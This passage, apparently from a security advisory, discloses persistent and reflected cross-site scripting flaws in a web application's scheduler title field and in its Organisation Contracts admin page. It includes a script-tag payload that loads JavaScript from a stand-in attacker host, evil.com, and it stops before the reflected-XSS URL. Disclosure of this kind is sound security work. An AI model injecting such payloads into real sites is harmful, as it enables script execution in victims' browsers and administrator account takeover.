4. *Vulnerability Description*
 
Cross-Site Scripting attacks are a type of injection problem, in which
malicious scripts are injected into the otherwise benign and trusted web sites.
Cross-site scripting (XSS) attacks occur when an attacker uses a web
application to send malicious code, generally in the form of a browser side
script, to a different end user. Flaws that allow these attacks to succeed are
in the output it generates without validating or encoding it.

found here:

7. *Technical Description*
 
7.1 A Persistent Cross Site Scripting vulnerability was found in the 'tittle'
variable within the scheduler module. This is because the application does not
properly sanitise the users input. The vulnerability can be triggered by a user
submitting the following data within the scheduler title:
 
    <SCRIPT SRC=//evil.com/xss.js></SCRIPT>
 
Which will include the xss.js javascript file within the schedule. A javascript
that exploits this issue and creates a new administrator user in the system can
be found in Bonsai's blog [2].
 
7.2 A Reflected Cross Site Scripting vulnerability was found in the
atksearch[contractnumber], atksearch_AE_customer[customer] and
atksearchmode[contracttype] variables within the 'Organisation Contracts'
administration page. This is because the application does not properly sanitise
the users input. The vulnerability can be triggered by clicking on the
following URL:
